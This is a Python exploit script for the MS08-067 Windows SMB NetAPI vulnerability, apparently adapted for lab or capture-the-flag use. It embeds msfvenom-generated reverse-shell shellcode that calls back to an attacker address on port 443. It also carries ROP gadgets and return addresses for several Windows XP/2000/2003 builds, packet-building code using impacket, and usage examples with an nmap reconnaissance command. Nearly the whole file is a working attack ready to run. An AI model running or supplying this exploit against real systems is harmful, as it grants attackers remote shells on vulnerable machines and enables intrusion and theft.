#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError as e:
    print('Install the following library to make this script work')
    print('Impacket : https://github.com/CoreSecurity/impacket.git')
    print('PyCrypto : https://pypi.python.org/pypi/pycrypto')
    sys.exit(1)

print('#######################################################################')
print('#   MS08-067 Exploit')
print('#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).')
print('#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi')
print('#')
print('#   Mod in 2018 by Andy Acer')
print('#   - Added support for selecting a target port at the command line.')
print('#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport')
print('#   - Changed shellcode handling to allow for variable length shellcode.')
print('#')
print('#   Mod in 2020 by Agent-Tiro')
print('#   - Small modification to make compatibly with Python3.7')
print('#######################################################################\n')

# ------------------------------------------------------------------------
# REPLACE THIS SHELLCODE with shellcode generated for your use
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.32 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86

shellcode =  b""                                                                              
shellcode += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"                                  
shellcode += b"\x5e\x81\x76\x0e\xc0\xf9\x85\x9f\x83\xee\xfc"                                  
shellcode += b"\xe2\xf4\x3c\x11\x07\x9f\xc0\xf9\xe5\x16\x25"                                  
shellcode += b"\xc8\x45\xfb\x4b\xa9\xb5\x14\x92\xf5\x0e\xcd"                                  
shellcode += b"\xd4\x72\xf7\xb7\xcf\x4e\xcf\xb9\xf1\x06\x29"                                  
shellcode += b"\xa3\xa1\x85\x87\xb3\xe0\x38\x4a\x92\xc1\x3e"                                  
shellcode += b"\x67\x6d\x92\xae\x0e\xcd\xd0\x72\xcf\xa3\x4b"                                  
shellcode += b"\xb5\x94\xe7\x23\xb1\x84\x4e\x91\x72\xdc\xbf"                                  
shellcode += b"\xc1\x2a\x0e\xd6\xd8\x1a\xbf\xd6\x4b\xcd\x0e"                                  
shellcode += b"\x9e\x16\xc8\x7a\x33\x01\x36\x88\x9e\x07\xc1"                                  
shellcode += b"\x65\xea\x36\xfa\xf8\x67\xfb\x84\xa1\xea\x24"                                  
shellcode += b"\xa1\x0e\xc7\xe4\xf8\x56\xf9\x4b\xf5\xce\x14"                                  
shellcode += b"\x98\xe5\x84\x4c\x4b\xfd\x0e\x9e\x10\x70\xc1"                                  
shellcode += b"\xbb\xe4\xa2\xde\xfe\x99\xa3\xd4\x60\x20\xa6"                                  
shellcode += b"\xda\xc5\x4b\xeb\x6e\x12\x9d\x91\xb6\xad\xc0"                                  
shellcode += b"\xf9\xed\xe8\xb3\xcb\xda\xcb\xa8\xb5\xf2\xb9"                                  
shellcode += b"\xc7\x06\x50\x27\x50\xf8\x85\x9f\xe9\x3d\xd1"                                  
shellcode += b"\xcf\xa8\xd0\x05\xf4\xc0\x06\x50\xcf\x90\xa9"                                  
shellcode += b"\xd5\xdf\x90\xb9\xd5\xf7\x2a\xf6\x5a\x7f\x3f"                                  
shellcode += b"\x2c\x12\xf5\xc5\x91\x8f\x95\xce\xd9\xed\x9d"                                  
shellcode += b"\xc0\xf8\x3e\x16\x26\x93\x95\xc9\x97\x91\x1c"                                  
shellcode += b"\x3a\xb4\x98\x7a\x4a\x45\x39\xf1\x93\x3f\xb7"                                  
shellcode += b"\x8d\xea\x2c\x91\x75\x2a\x62\xaf\x7a\x4a\xa8"                                  
shellcode += b"\x9a\xe8\xfb\xc0\x70\x66\xc8\x97\xae\xb4\x69"                                  
shellcode += b"\xaa\xeb\xdc\xc9\x22\x04\xe3\x58\x84\xdd\xb9"                                  
shellcode += b"\x9e\xc1\x74\xc1\xbb\xd0\x3f\x85\xdb\x94\xa9"                                  
shellcode += b"\xd3\xc9\x96\xbf\xd3\xd1\x96\xaf\xd6\xc9\xa8"                                  
shellcode += b"\x80\x49\xa0\x46\x06\x50\x16\x20\xb7\xd3\xd9"                                  
shellcode += b"\x3f\xc9\xed\x97\x47\xe4\xe5\x60\x15\x42\x65"                                  
shellcode += b"\x82\xea\xf3\xed\x39\x55\x44\x18\x60\x15\xc5"                                  
shellcode += b"\x83\xe3\xca\x79\x7e\x7f\xb5\xfc\x3e\xd8\xd3"                                  
shellcode += b"\x8b\xea\xf5\xc0\xaa\x7a\x4a"
# ------------------------------------------------------------------------

# Gotta make No-Ops (NOPS) + shellcode = 410 bytes
num_nops = 410 - len(shellcode)
newshellcode = b"\x90" * num_nops
newshellcode += shellcode  # Add NOPS to the front
shellcode = newshellcode   # Switcheroo with the newshellcode temp variable

nonxjmper = b"\x08\x04\x02\x00%s" + b"A" * 4 + b"%s" + \
    b"A" * 42 + b"\x90" * 8 + b"\xeb\x62" + b"A" * 10
disableNXjumper = b"\x08\x04\x02\x00%s%s%s" + b"A" * \
    28 + b"%s" + b"\xeb\x02" + b"\x90" * 2 + b"\xeb\x62"
ropjumper = b"\x00\x08\x01\x00" + b"%s" + b"\x10\x01\x04\x01";
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = b"\x90\x5a\x59\xc3"
    gadget2 = [b"\x90\x89\xc7\x83", b"\xc7\x0c\x6a\x7f", b"\x59\xf2\xa5\x90"]
    gadget3 = b"\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()

        # MODIFIED HERE
        # Changed __port to port ... not sure if that does anything. I'm a newb.
        self.port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print('Windows XP SP0/SP1 Universal\n')
            ret = b"\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print('Windows 2000 Universal\n')
            ret = b"\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print('Windows 2003 SP0 Universal\n')
            ret = b"\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print('Windows 2003 SP1 English\n')
            ret_dec = b"\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = b"\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = b"\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = b"\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print('Windows XP SP3 French (NX)\n')
            ret = b"\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = b"\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print('Windows XP SP3 English (NX)\n')
            ret = b"\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = b"\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print('Windows XP SP3 English (AlwaysOn NX)\n')
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print('Not supported OS version\n')
            sys.exit(-1)

        print('[-]Initiating connection')

        # MORE MODIFICATIONS HERE #############################################################################################

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
        
        self.__trans.connect()
        #print('[-]connected to ncacn_np:%s[\\pipe\\browser]') % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = b"\x5c\x00" + b"ABCDEFGHIJ" * 10 + shellcode + b"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            b"\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + b"\x00" * 2
        server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        
        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = b"\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = b"\x00\x00\x00\x00"
        ActualCount = b"\x36\x01\x00\x00" # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"        

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print('Exploit finish\n')

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = sys.argv[2]
           port = sys.argv[3]
       except IndexError:
                print('\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0])
                print('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
                print('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
                print('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
                print('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
                print('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
                print('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
                print('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
                print('')
                print('FYI: nmap has a good OS discovery script that pairs well with this exploit:')
                print('nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1')
                print('')
                sys.exit(-1)


current = SRVSVC_Exploit(target, os, port)
current.start()

